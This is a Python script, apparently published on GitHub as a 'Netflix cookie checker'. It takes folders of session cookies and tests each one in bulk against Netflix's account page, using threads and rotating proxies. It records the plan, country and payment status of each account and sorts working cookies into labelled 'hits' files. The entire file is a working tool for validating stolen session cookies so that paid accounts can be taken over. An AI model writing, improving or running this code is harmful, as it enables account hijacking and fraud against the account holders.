import requests
import os
import threading
import colorama
import shutil
import re
import json
import random
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# Global counters
total_working = 0
total_fails = 0
total_unsubscribed = 0
total_checked = 0
lock = threading.Lock()

# Global paths
cookies_folder = "cookies" # Directory where your cookies are stored
hits_folder = "hits" # Directory to save working cookies
failures_folder = "failures" # Directory to move failed cookies
broken_folder = "broken" # Directory to move broken cookies
free_folder = "free" # Directory to free cookies
proxy_file = "proxy.txt" # File containing proxies

# Global proxy list
proxies_list = []
proxy_lock = threading.Lock()

# Global set to track processed user GUIDs to avoid duplicates
processed_guids = set()
guid_lock = threading.Lock()

def print_banner():
    print(colorama.Fore.RED + """

███╗░░██╗███████╗████████╗███████╗██╗░░░░░██╗██╗░░██╗  ░█████╗░░█████╗░░█████╗░██╗░░██╗██╗███████╗
████╗░██║██╔════╝╚══██╔══╝██╔════╝██║░░░░░██║╚██╗██╔╝  ██╔══██╗██╔══██╗██╔══██╗██║░██╔╝██║██╔════╝
██╔██╗██║█████╗░░░░░██║░░░█████╗░░██║░░░░░██║░╚███╔╝░  ██║░░╚═╝██║░░██║██║░░██║█████═╝░██║█████╗░░
██║╚████║██╔══╝░░░░░██║░░░██╔══╝░░██║░░░░░██║░██╔██╗░  ██║░░██╗██║░░██║██║░░██║██╔═██╗░██║██╔══╝░░
██║░╚███║███████╗░░░██║░░░██║░░░░░███████╗██║██╔╝╚██╗  ╚█████╔╝╚█████╔╝╚█████╔╝██║░╚██╗██║███████╗
╚═╝░░╚══╝╚══════╝░░░╚═╝░░░╚═╝░░░░░╚══════╝╚═╝╚═╝░░╚═╝  ░╚════╝░░╚════╝░░╚════╝░╚═╝░░╚═╝╚═╝╚══════╝
               
                   ░█████╗░██╗░░██╗███████╗░█████╗░██╗░░██╗███████╗██████╗░
                   ██╔══██╗██║░░██║██╔════╝██╔══██╗██║░██╔╝██╔════╝██╔══██╗
                   ██║░░╚═╝███████║█████╗░░██║░░╚═╝█████═╝░█████╗░░██████╔╝
                   ██║░░██╗██╔══██║██╔══╝░░██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
                   ╚█████╔╝██║░░██║███████╗╚█████╔╝██║░╚██╗███████╗██║░░██║
                   ░╚════╝░╚═╝░░╚═╝╚══════╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝                      
                            
                by https://github.com/harshitkamboj | discord: illuminatis69
                        (Star The Repo 🌟 and Share for more Checkers)                              
    """)
    print("---------------------------------------------------------------------------------------------" + colorama.Fore.RESET)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def load_proxies():
    """Load proxies from proxy.txt file"""
    global proxies_list
    if not os.path.exists(proxy_file):
        print(colorama.Fore.YELLOW + f"> Proxy file '{proxy_file}' not found. Running without proxies..." + colorama.Fore.RESET)
        return
    
    try:
        with open(proxy_file, 'r', encoding='utf-8') as f:
            proxies_list = [line.strip() for line in f if line.strip()]
        
        if proxies_list:
            print(colorama.Fore.CYAN + f"> Loaded {len(proxies_list)} proxies from {proxy_file}" + colorama.Fore.RESET)
        else:
            print(colorama.Fore.YELLOW + f"> No proxies found in {proxy_file}. Running without proxies..." + colorama.Fore.RESET)
    except Exception as e:
        print(colorama.Fore.YELLOW + f"> Error loading proxies: {str(e)}. Running without proxies..." + colorama.Fore.RESET)

def get_random_proxy():
    """Get a random proxy from the loaded proxy list"""
    if not proxies_list:
        return None
    
    with proxy_lock:
        proxy = random.choice(proxies_list)
        # Support different proxy formats including user:pass@ip:port
        if '://' not in proxy:
            # Check if it has user:pass@ip:port format
            if '@' in proxy:
                # Format: user:pass@ip:port
                proxy = f'http://{proxy}'
            else:
                # Format: ip:port
                proxy = f'http://{proxy}'
        
        return {
            'http': proxy,
            'https': proxy
        }

def create_session_with_retry():
    """Create a requests session with retry strategy"""
    session = requests.Session()
    
    # Configure retry strategy with updated parameter name
    try:
        # Try with newer urllib3 version parameter
        retry_strategy = Retry(
            total=3,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["HEAD", "GET", "OPTIONS"], # Updated parameter name
            backoff_factor=1
        )
    except TypeError:
        # Fallback for older urllib3 versions
        retry_strategy = Retry(
            total=3,
            status_forcelist=[429, 500, 502, 503, 504],
            method_whitelist=["HEAD", "GET", "OPTIONS"], # Old parameter name
            backoff_factor=1
        )
    
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    
    return session

def convert_to_netscape_format(cookie):
    """ Convert the cookie dictionary to the Netscape cookie format string """
    return "{}\t{}\t{}\t{}\t{}\t{}\t{}".format(
        cookie['domain'], 'TRUE' if cookie['flag'].upper() == 'TRUE' else 'FALSE', cookie['path'],
        'TRUE' if cookie['secure'] else 'FALSE', cookie['expiration'], cookie['name'], cookie['value']
    )

def process_json_files(directory):
    """ Process JSON files, convert them to Netscape format, and move the originals to a different folder """
    json_after_conversion_folder = "json_cookies_after_conversion" # Directory to move JSON cookies after conversion
    os.makedirs(json_after_conversion_folder, exist_ok=True)
    
    for filename in os.listdir(directory):
        if filename.endswith(".json"):
            file_path = os.path.join(directory, filename)
            with open(file_path, 'r') as file:
                try:
                    cookies = json.load(file)
                    if isinstance(cookies, list) and all('domain' in cookie for cookie in cookies):
                        netscape_cookie_file = os.path.join(directory, filename.replace('.json', '.txt'))
                        with open(netscape_cookie_file, 'w') as outfile:
                            outfile.writelines([convert_to_netscape_format(cookie) + '\n' for cookie in cookies])
                        shutil.move(file_path, os.path.join(json_after_conversion_folder, filename))
                except json.JSONDecodeError:
                    print(f"Error decoding JSON from file {filename}")

def load_cookies_from_file(cookie_file):
    """Load cookies from a given file and return a dictionary of cookies."""
    cookies = {}
    with open(cookie_file, 'r', encoding='utf-8') as f:
        for line in f:
            parts = line.strip().split('\t')
            if len(parts) >= 7:
                domain, _, path, secure, expires, name, value = parts[:7]
                cookies[name] = value
            else:
                print(colorama.Fore.YELLOW + f"> Invalid cookie line: {line.strip()}" + colorama.Fore.RESET)
                if os.path.exists(cookie_file):
                    shutil.move(cookie_file, os.path.join(broken_folder, os.path.basename(cookie_file)))
    return cookies

def make_request_with_cookies(cookies):
    """Make an HTTP request using provided cookies and return the response text."""
    session = create_session_with_retry()
    session.cookies.update(cookies)
    
    # Get proxy if available
    proxy = get_random_proxy()
    
    try:
        if proxy:
            response = session.get("https://www.netflix.com/YourAccount",
                                proxies=proxy,
                                timeout=30,
                                headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                                })
        else:
            response = session.get("https://www.netflix.com/YourAccount",
                                timeout=30,
                                headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                                })
        return response.text
    except requests.exceptions.ProxyError:
        # If proxy fails, try without proxy
        print(colorama.Fore.YELLOW + f"> Proxy failed, retrying without proxy..." + colorama.Fore.RESET)
        response = session.get("https://www.netflix.com/YourAccount",
                            timeout=30,
                            headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                            })
        return response.text
    except Exception as e:
        raise e

def extract_info(response_text):
    """Extract relevant information from the response text."""
    patterns = {
        'countryOfSignup': r'"countryOfSignup":\s*"([^"]+)"',
        'memberSince': r'"memberSince":\s*"([^"]+)"',
        'userGuid': r'"userGuid":\s*"([^"]+)"',
        'showExtraMemberSection': r'"showExtraMemberSection":\s*\{\s*"fieldType":\s*"Boolean",\s*"value":\s*(true|false)',
        'membershipStatus': r'"membershipStatus":\s*"([^"]+)"',
        'maxStreams': r'maxStreams\":\{\"fieldType\":\"Numeric\",\"value\":([^,]+),',
        'localizedPlanName': r'localizedPlanName\":\{\"fieldType\":\"String\",\"value\":\"([^"]+)\"',
        'paymentMethodExists': r'"paymentMethodExists":\s*\{\s*"fieldType":\s*"Boolean",\s*"value":\s*(true|false)'
    }
    
    extracted_info = {key: re.search(pattern, response_text).group(1) if re.search(pattern, response_text) else None for key, pattern in patterns.items()}
    
    # Additional processing for plan names
    if extracted_info['localizedPlanName']:
        extracted_info['localizedPlanName'] = extracted_info['localizedPlanName'].replace('x28', '').replace('\\', ' ').replace('x20', '').replace('x29', '')
    
    # Fixing Member since format
    if extracted_info['memberSince']:
        extracted_info['memberSince'] = extracted_info['memberSince'].replace("\\x20", " ")
    
    # Fixing boolean values
    if extracted_info['showExtraMemberSection']:
        extracted_info['showExtraMemberSection'] = extracted_info['showExtraMemberSection'].capitalize()
    
    if extracted_info['paymentMethodExists']:
        extracted_info['paymentMethodExists'] = extracted_info['paymentMethodExists'].capitalize()
    
    return extracted_info

def is_duplicate_guid(user_guid):
    """Check if user GUID is already processed to avoid duplicates"""
    with guid_lock:
        if user_guid in processed_guids:
            return True
        processed_guids.add(user_guid)
        return False

def generate_unknown_guid():
    """Generate a unique unknown GUID with random number"""
    return f"unknown{random.randint(10000000, 99999999)}"

def handle_successful_login(cookie_file, info, is_subscribed):
    """Handle the actions required after a successful login."""
    global total_working
    global total_unsubscribed
    
    # Handle user GUID for duplicate checking
    user_guid = info['userGuid'] if info['userGuid'] and info['userGuid'] != "null" else generate_unknown_guid()
    
    # Check for duplicates
    if is_duplicate_guid(user_guid):
        print(colorama.Fore.GREY + f"> Duplicate user GUID {user_guid} found. Skipping {cookie_file}." + colorama.Fore.RESET)
        if os.path.exists(cookie_file):
            os.remove(cookie_file)
        return
    
    if not is_subscribed:
        with lock:
            total_unsubscribed += 1
        
        print(colorama.Fore.MAGENTA + f"> Login successful with {cookie_file}. But the user is not subscribed. Moved to free folder!" + colorama.Fore.RESET)
        
        # Get payment method status
        payment_method = info['paymentMethodExists'] if info['paymentMethodExists'] else "False"
        country = info['countryOfSignup'] if info['countryOfSignup'] else "Unknown"
        
        # Create filename for free folder
        new_filename = f"PaymentM-{payment_method}_{country}_github-harshitkamboj_{user_guid}.txt"
        new_filepath = os.path.join(free_folder, new_filename)
        
        # Read original cookie content
        with open(cookie_file, 'r', encoding='utf-8') as infile:
            original_cookie_content = infile.read()
        
        # Write to free folder with new format
        with open(new_filepath, 'w', encoding='utf-8') as outfile:
            outfile.write(f"Payment Method: {payment_method}\n")
            outfile.write(f"Country: {country}\n")
            outfile.write("Checker By: github.com/harshitkamboj\n")
            outfile.write("Netflix Cookie 👇\n\n\n")
            outfile.write(original_cookie_content)
        
        # Remove original file
        os.remove(cookie_file)
        return
    
    with lock:
        total_working += 1
    
    print(colorama.Fore.GREEN + f"> Login successful with {cookie_file} | " + colorama.Fore.LIGHTGREEN_EX + f"\033[3mCountry: {info['countryOfSignup']}, Member since: {info['memberSince']}, Extra members: {info['showExtraMemberSection']}, Max Streams: {info['maxStreams']}.\033[0m" + colorama.Fore.RESET)
    
    # Fix max streams value and use it in filename
    max_streams_clean = info['maxStreams'].rstrip('}') if info['maxStreams'] else "Unknown"
    new_filename = f"{max_streams_clean}_{info['countryOfSignup']}_github-harshitkamboj_{info['showExtraMemberSection']}_{user_guid}.txt"
    new_filepath = os.path.join(hits_folder, new_filename)
    
    with open(cookie_file, 'r', encoding='utf-8') as infile:
        original_cookie_content = infile.read()
    
    # Fixing Plan name
    plan_name = info['localizedPlanName'].replace("miembro u00A0extra", "(Extra Member)") if info['localizedPlanName'] else "Unknown"
    
    # Fixing Member since
    member_since = info['memberSince'].replace("\x20", " ") if info['memberSince'] else "Unknown"
    
    # Fixing Max Streams
    max_streams = info['maxStreams'].rstrip('}') if info['maxStreams'] else "Unknown"
    
    # Converting Extra members to Yes/No
    extra_members = "Yes✅" if info['showExtraMemberSection'] == "True" else "No❌" if info['showExtraMemberSection'] == "False" else "None"
    
    with open(new_filepath, 'w', encoding='utf-8') as outfile:
        outfile.write(f"Max Streams: {max_streams} Screens\n")
        outfile.write(f"Plan: {plan_name}\n")
        outfile.write(f"Country: {info['countryOfSignup']}\n")
        outfile.write(f"Member Since: {member_since}\n")
        outfile.write(f"Extra members: {extra_members}\n")
        outfile.write("Checker By: github.com/harshitkamboj\n")
        outfile.write("Netflix Cookie 👇\n\n\n")
        outfile.write(original_cookie_content)
    
    os.remove(cookie_file)

def handle_failed_login(cookie_file):
    """Handle the actions required after a failed login."""
    global total_fails
    with lock:
        total_fails += 1
    
    print(colorama.Fore.RED + f"> Login failed with {cookie_file}. This cookie has expired. Moved to failures folder!" + colorama.Fore.RESET)
    if os.path.exists(cookie_file):
        shutil.move(cookie_file, os.path.join(failures_folder, os.path.basename(cookie_file)))

def process_cookie_file(cookie_file):
    """Process each cookie file to check for a valid login and move accordingly."""
    global total_checked
    with lock:
        total_checked += 1
    
    try:
        cookies = load_cookies_from_file(cookie_file)
        response_text = make_request_with_cookies(cookies)
        info = extract_info(response_text)
        
        if info['countryOfSignup'] and info['countryOfSignup'] != "null":
            is_subscribed = info['membershipStatus'] == "CURRENT_MEMBER"
            handle_successful_login(cookie_file, info, is_subscribed)
            return True
        else:
            handle_failed_login(cookie_file)
            return False
    except Exception as e:
        print(colorama.Fore.YELLOW + f"> Error with {cookie_file}: {str(e)}" + colorama.Fore.RESET)
        if os.path.exists(cookie_file):
            shutil.move(cookie_file, os.path.join(broken_folder, os.path.basename(cookie_file)))

def worker(cookie_files):
    """Worker thread to process cookie files."""
    while cookie_files:
        cookie_file = cookie_files.pop()
        process_cookie_file(cookie_file)

def check_cookies_directory(num_threads=20):
    """Setup directories and threads to process all cookie files."""
    os.makedirs(hits_folder, exist_ok=True)
    os.makedirs(failures_folder, exist_ok=True)
    os.makedirs(broken_folder, exist_ok=True)
    os.makedirs(free_folder, exist_ok=True)
    
    # Load proxies before starting
    load_proxies()
    
    process_json_files(cookies_folder) # Convert JSON cookies to Netscape format
    
    cookie_files = [os.path.join(cookies_folder, f) for f in os.listdir(cookies_folder) if f.endswith('.txt')]
    
    threads = [threading.Thread(target=worker, args=(cookie_files,)) for _ in range(min(num_threads, len(cookie_files)))]
    
    clear_screen()
    print_banner()
    print(colorama.Fore.CYAN + f"\n> Started checking {len(cookie_files)} cookie files..." + colorama.Fore.RESET)
    if proxies_list:
        print(colorama.Fore.CYAN + f"> Using {len(proxies_list)} proxies for requests" + colorama.Fore.RESET)
    
    for thread in threads:
        thread.start()
    
    for thread in threads:
        thread.join()
    
    # Display statistics
    printStats()

def printStats():
    """Print the statistics of the cookies check."""
    print("\n-------------------------------------------------------------------\n")
    print(colorama.Fore.CYAN + f"> Statistics:" + colorama.Fore.RESET)
    print(f" - 📈 Total checked: {total_checked}")
    print(f" - ✅ Working cookies: {colorama.Fore.GREEN}{total_working}{colorama.Fore.RESET}")
    print(f" - ❌ Working but no subscription: {colorama.Fore.MAGENTA}{total_unsubscribed}{colorama.Fore.RESET}")
    print(f" - 💀 Dead cookies: {colorama.Fore.RED}{total_fails}{colorama.Fore.RESET}")
    print(f" - ❤️ Thanks For Using Checker --- Checker by https://github.com/harshitkamboj")
    print("\n")

def get_started(cookies_error=False):
    """Get started with the program."""
    os.makedirs(cookies_folder, exist_ok=True)
    
    if not cookies_error:
        clear_screen()
        print_banner()
        print(colorama.Fore.GREEN + "\n              👉  Welcome, after moving your cookies to (cookies) folder, press  👈\n                                 Enter if you're ready to start!" + colorama.Fore.RESET)
        input()
    
    dir_content = [f for f in os.listdir(cookies_folder) if not f.startswith('.') and (f.endswith('.txt') or f.endswith('.json'))]
    
    if not dir_content:
        print(colorama.Fore.RED + "> No cookies found in the cookies folder.\n> Please add cookies in Netscape/JSON format (.txt | .json) and try again." + colorama.Fore.RESET)
        get_started(True)

def main():
    """Initialize the program."""
    colorama.init()
    get_started()
    check_cookies_directory()

if __name__ == "__main__":
    main()
